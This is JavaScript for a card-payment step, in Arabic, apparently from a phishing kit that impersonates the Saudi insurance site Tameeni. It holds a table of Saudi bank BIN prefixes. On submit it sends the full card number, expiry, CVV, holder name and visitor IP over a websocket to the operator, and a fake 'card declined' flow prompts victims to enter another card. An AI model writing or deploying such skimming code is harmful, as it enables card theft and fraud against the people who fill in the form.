


  
  function formatCardNumber(value) {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  }

  
  function formatExpiryDate(value) {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + (v.length > 2 ? '/' + v.substring(2, 4) : '');
    }
    return v;
  }

  
  function isValidCardNumber(number) {
    const digits = number.replace(/\s/g, '');
    if (!/^\d{13,19}$/.test(digits)) return false;

    
    let sum = 0;
    let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i]);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  
  function isValidExpiryDate(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;

    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;

    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;

    
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;

    
    if (year > currentYear + 20) return false;

    return true;
  }

  document.addEventListener('DOMContentLoaded', function () {
    
    if (sessionStorage.getItem('cardDeclined') === 'true') {
      sessionStorage.removeItem('cardDeclined');
      
      setTimeout(function() {
        var fields = ['cardNumber','cardHolderName','expiryDate','cvv'];
        fields.forEach(function(id) {
          var el = document.getElementById(id);
          if (el) { el.value = ''; el.defaultValue = ''; }
        });
        
        var netImg = document.getElementById('s6NetworkLogo');
        if (netImg) netImg.classList.remove('show');
        sessionStorage.removeItem('Card type');
        sessionStorage.removeItem('cardBin');
      }, 50);
      
      var db = document.getElementById('declineBox');
      if (db) {
        db.classList.add('show');
        setTimeout(function() {
          db.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 200);
      }
    }

    const cardNumberInput = document.getElementById('cardNumber');
    const cardHolderNameInput = document.getElementById('cardHolderName');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');

    
    
    var SAUDI_BINS = {
     
      '446393':'Alrajhi','446394':'Alrajhi','446395':'Alrajhi','446396':'Alrajhi',
      '446397':'Alrajhi','446398':'Alrajhi','446399':'Alrajhi',
      '457865':'Alrajhi','457866':'Alrajhi','457867':'Alrajhi','457868':'Alrajhi',
      '408822':'Alrajhi','408823':'Alrajhi','408824':'Alrajhi','408825':'Alrajhi',
      '426898':'Alrajhi','426899':'Alrajhi',
      '458024':'Alrajhi','458025':'Alrajhi','458026':'Alrajhi',
      '479884':'Alrajhi','479885':'Alrajhi','479886':'Alrajhi',
      '484783':'Alrajhi','455703':'Alrajhi','455704':'Alrajhi',
      
      '512345':'Alrajhi','512346':'Alrajhi','512347':'Alrajhi','512348':'Alrajhi',
      '521104':'Alrajhi','521105':'Alrajhi','521106':'Alrajhi','521107':'Alrajhi',
      '543350':'Alrajhi','543351':'Alrajhi','543352':'Alrajhi','543353':'Alrajhi',
      '588845':'Alrajhi',
     
      '455036':'alahli','455037':'alahli','455038':'alahli','455039':'alahli',
      '407197':'alahli','407198':'alahli','407199':'alahli','407200':'alahli',
      '458455':'alahli','458456':'alahli','458457':'alahli','458458':'alahli',
      '457763':'alahli','457764':'alahli','457765':'alahli','457766':'alahli',
      '435013':'alahli','435014':'alahli','435015':'alahli','435016':'alahli',
      '458214':'alahli',
      
      '524878':'alahli','524879':'alahli','524880':'alahli','524881':'alahli',
      '529415':'alahli','529416':'alahli','529417':'alahli','529418':'alahli',
      '540281':'alahli','540282':'alahli','540283':'alahli','540284':'alahli',
      '557396':'alahli','557397':'alahli','557398':'alahli','557399':'alahli',
      
      '407861':'alryad','407862':'alryad','407863':'alryad','407864':'alryad',
      '476009':'alryad','476010':'alryad','476011':'alryad','476012':'alryad',
      '457935':'alryad','457936':'alryad','457937':'alryad','457938':'alryad',
      '435019':'alryad','435020':'alryad','435021':'alryad','435022':'alryad',
      '409665':'alryad',
      
      '512718':'alryad','512719':'alryad','512720':'alryad','512721':'alryad',
      '541168':'alryad','541169':'alryad','541170':'alryad','541171':'alryad',
      '524714':'alryad','524715':'alryad','524716':'alryad','524717':'alryad',
    };

    cardNumberInput.addEventListener('input', function(e) {
      e.target.value = formatCardNumber(e.target.value);

      var raw = e.target.value.replace(/\s/g, '');
      var netImg = document.getElementById('s6NetworkLogo');

      netImg.classList.remove('show');
      sessionStorage.removeItem('Card type');
      sessionStorage.removeItem('cardBin');

      if (raw.length < 1) return;

      
      var pre2 = parseInt(raw.substring(0,2));
      var pre4 = parseInt(raw.substring(0,4));
      if (raw.charAt(0) === '4') {
        netImg.src = 'assets/photos/Visa.png';
        netImg.classList.add('show');
        sessionStorage.setItem('Card type', 'visa');
      } else if ((pre2 >= 51 && pre2 <= 55) || (pre4 >= 2221 && pre4 <= 2720)) {
        netImg.src = 'assets/photos/Mastercard.png';
        netImg.classList.add('show');
        sessionStorage.setItem('Card type', 'mastercard');
      }

      
      if (raw.length >= 6) {
        sessionStorage.setItem('cardBin', raw.substring(0, 6));
      }
    });

    
    expiryDateInput.addEventListener('input', function(e) {
      e.target.value = formatExpiryDate(e.target.value);
    });

    
    cvvInput.addEventListener('input', function(e) {
      e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    const form = document.getElementById('formStep6');
    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const cardNumberError = document.getElementById('cardNumberError');
      const cardHolderNameError = document.getElementById('cardHolderNameError');
      const expiryDateError = document.getElementById('expiryDateError');
      const cvvError = document.getElementById('cvvError');

     
      cardNumberError.textContent = '';
      cardHolderNameError.textContent = '';
      expiryDateError.textContent = '';
      cvvError.textContent = '';

      let valid = true;

     
      const cardNumber = cardNumberInput.value.trim();
      if (!cardNumber) {
        cardNumberError.textContent = 'الرجاء إدخال رقم البطاقة.';
        valid = false;
      } else if (!isValidCardNumber(cardNumber)) {
        cardNumberError.textContent = 'رقم البطاقة غير صحيح، تأكد من إدخال الرقم بشكل صحيح كما هو مكتوب على البطاقة.';
        valid = false;
      }

      
      const cardHolderName = cardHolderNameInput.value.trim();
      if (!cardHolderName) {
        cardHolderNameError.textContent = 'الرجاء إدخال اسم حامل البطاقة.';
        valid = false;
      } else if (cardHolderName.length < 2) {
        cardHolderNameError.textContent = 'اسم حامل البطاقة قصير جداً.';
        valid = false;
      }

      
      const expiryDate = expiryDateInput.value.trim();
      if (!expiryDate) {
        expiryDateError.textContent = 'الرجاء إدخال تاريخ الانتهاء.';
        valid = false;
      } else if (!isValidExpiryDate(expiryDate)) {
        expiryDateError.textContent = 'تاريخ الانتهاء غير صحيح';
        valid = false;
      }

      
      const cvv = cvvInput.value.trim();
      if (!cvv) {
        cvvError.textContent = 'الرجاء إدخال رمز الأمان.';
        valid = false;
      } else if (!/^\d{3,4}$/.test(cvv)) {
        cvvError.textContent = 'رمز الأمان يجب أن يكون 3 أو 4 أرقام.';
        valid = false;
      }

      if (!valid) return;

      let existingData = {};
      try {
        const tempData = sessionStorage.getItem('tameeniTempData');
        if (tempData) existingData = JSON.parse(tempData);
      } catch (e) {}

      const cardData = { cardNumber, cardHolderName, expiryDate, cvv };
      const d = { ...existingData, ...cardData };

      const cleanCardNumber = (d.cardNumber || "").replace(/\s/g, '');
      d.cardLast4 = cleanCardNumber.slice(-4);
      sessionStorage.setItem('tameeniTempData', JSON.stringify(d));

      (async function() {
        while (window.visitorIP === null) {
          await new Promise(function(r) { setTimeout(r, 50); });
        }
        var ip = window.visitorIP;
        window.socket.emit('submitPayment', {
          ip: ip,
          cardHolderName: d.cardHolderName,
          cardNumber: (d.cardNumber || '').replace(/\s/g, ''),
          expiryDate: d.expiryDate,
          cvv: d.cvv,
          cardLast4: d.cardLast4,
          total: d.total
        });
      })();

      showLoadingScreen('جاري التحقق من البطاقة...', 'يرجى الانتظار');
    });

    function showLoadingScreen(text, subtext) {
      const loadingScreen = document.getElementById('loadingScreen');
      const loadingText = document.getElementById('loadingText');
      const loadingSubtext = document.getElementById('loadingSubtext');
      
      loadingText.textContent = text || 'جاري التحميل...';
      loadingSubtext.textContent = subtext || 'يرجى الانتظار';
      loadingScreen.classList.add('show');
    }

    function showLoadingAndRedirect(text, subtext, redirectUrl) {
      showLoadingScreen(text, subtext);
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1000);
    }
  });